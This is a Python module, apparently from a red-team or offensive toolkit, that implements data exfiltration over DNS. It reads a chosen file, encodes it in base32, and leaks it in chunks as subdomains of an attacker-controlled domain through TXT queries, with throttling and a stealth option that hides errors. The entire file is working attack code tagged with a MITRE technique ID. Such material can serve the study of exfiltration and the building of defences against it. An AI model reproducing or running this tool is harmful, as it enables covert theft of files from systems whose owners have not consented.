# modules/exploits/dns_txt_exfiltrator.py

import argparse
import base64
import dns.resolver
import time
import os
import json
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1048.003"  # Exfiltration Over Alternative Protocol (DNS)

def log_exfil(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def chunk_data(data, maxlen=50):
    return [data[i:i + maxlen] for i in range(0, len(data), maxlen)]

def exfiltrate_via_dns(domain, file_path, delay=1.0, stealth=False):
    with open(file_path, "rb") as f:
        raw = f.read()
    b64_data = base64.b32encode(raw).decode().lower()
    chunks = chunk_data(b64_data)

    resolver = dns.resolver.Resolver()
    resolver.nameservers = ["8.8.8.8", "1.1.1.1"]

    for i, chunk in enumerate(chunks):
        subdomain = f"{chunk}.{i}.{domain}"
        try:
            resolver.resolve(subdomain, "TXT")
        except Exception as e:
            if not stealth:
                print(f"[!] {subdomain} failed: {e}")
        time.sleep(delay)

    log_exfil({
        "timestamp": datetime.utcnow().isoformat(),
        "method": "dns_txt",
        "file": file_path,
        "domain": domain,
        "chunks": len(chunks),
        "ttp": MITRE_TTP
    })

    print(f"[âœ“] Data exfiltrated over DNS in {len(chunks)} TXT requests")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS TXT Exfiltrator")
    parser.add_argument("--file", required=True, help="File to exfiltrate")
    parser.add_argument("--domain", required=True, help="Attacker-controlled domain (e.g. exfil.yourdomain.com)")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between DNS requests")
    parser.add_argument("--stealth", action="store_true")
    args = parser.parse_args()

    exfiltrate_via_dns(args.domain, args.file, args.delay, args.stealth)
